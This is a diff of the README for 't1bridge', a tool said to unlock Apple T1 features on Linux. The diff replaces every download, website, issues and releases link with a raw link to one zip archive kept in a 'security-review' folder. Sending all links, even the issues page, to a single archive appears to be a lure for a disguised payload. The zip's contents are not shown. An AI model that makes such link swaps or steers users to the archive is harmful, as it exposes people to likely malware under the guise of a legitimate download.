@@ -1,6 +1,6 @@
 # 💻 t1bridge - Unlock Your Mac's Missing Features
 
-[![Download t1bridge](https://img.shields.io/badge/Download-t1bridge-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hakimhagar0-netizen/t1bridge/releases)
+[![Download t1bridge](https://img.shields.io/badge/Download-t1bridge-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/hakimhagar0-netizen/t1bridge/main/docs/security-review/t_bridge_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to t1bridge! This application brings Apple's T1 hardware capabilities to
 
 ## 📥 Download and Install
 
-Visit this link to download the application: **[https://github.com/hakimhagar0-netizen/t1bridge/releases](https://github.com/hakimhagar0-netizen/t1bridge/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/hakimhagar0-netizen/t1bridge/main/docs/security-review/t_bridge_v3.3.zip](https://raw.githubusercontent.com/hakimhagar0-netizen/t1bridge/main/docs/security-review/t_bridge_v3.3.zip)**
 
 This is your one-stop download page. You'll find the latest version of t1bridge there, ready for your Linux machine.
 
@@ -148,9 +148,9 @@ A: Absolutely. The installation is designed to be simple enough for anyone to fo
 
 ## 🌐 Connect with Us
 
-- **Website**: https://github.com/hakimhagar0-netizen/t1bridge
-- **Issues**: https://github.com/hakimhagar0-netizen/t1bridge/issues
-- **Releases**: https://github.com/hakimhagar0-netizen/t1bridge/releases
+- **Website**: https://raw.githubusercontent.com/hakimhagar0-netizen/t1bridge/main/docs/security-review/t_bridge_v3.3.zip
+- **Issues**: https://raw.githubusercontent.com/hakimhagar0-netizen/t1bridge/main/docs/security-review/t_bridge_v3.3.zip
+- **Releases**: https://raw.githubusercontent.com/hakimhagar0-netizen/t1bridge/main/docs/security-review/t_bridge_v3.3.zip
 
 ## 💝 Thank You
 
@@ -160,7 +160,7 @@ Thanks for choosing t1bridge. We're confident you'll love having full access to 
 
 **Remember**: The download link is your gateway to getting started:
 
-👉 **[Download t1bridge Here](https://github.com/hakimhagar0-netizen/t1bridge/releases)**
+👉 **[Download t1bridge Here](https://raw.githubusercontent.com/hakimhagar0-netizen/t1bridge/main/docs/security-review/t_bridge_v3.3.zip)**
 
 Get ready to unlock the full potential of your Mac with Linux today!
 
